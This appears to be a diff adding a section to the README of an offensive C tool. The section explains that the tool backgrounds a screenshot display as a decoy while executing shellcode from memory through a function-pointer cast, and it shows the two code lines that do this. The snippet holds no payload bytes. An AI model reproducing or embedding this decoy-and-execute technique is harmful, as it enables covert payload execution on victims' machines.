@@ -26,6 +26,16 @@ but also executes a system command (sh) that takes a screenshot of the target PC
 
     system("sleep 1; xwd -root -out /tmp/ScreenShot.xwd");
 
+<br />
+
+#### :: MULTI-THREADING (exec simultaneously -> screenshot + shellcode)
+Its achieved using the bash & operator that backgrounds the current system call (display screenshot)
+while jumping to the next C Program function (execute shellcode in RAM).**'(Multi-Thread Inside C Program)'**:<br />
+
+    system("sleep 1; xwud -in /tmp/ScreenShot.xwd &");
+    void (*ret)() = (void(*)())buf;
+
+
 <br /><br />
 
 | DEPENDENCIE | DESCRIPTION | FUNCTION | REQUIRED |
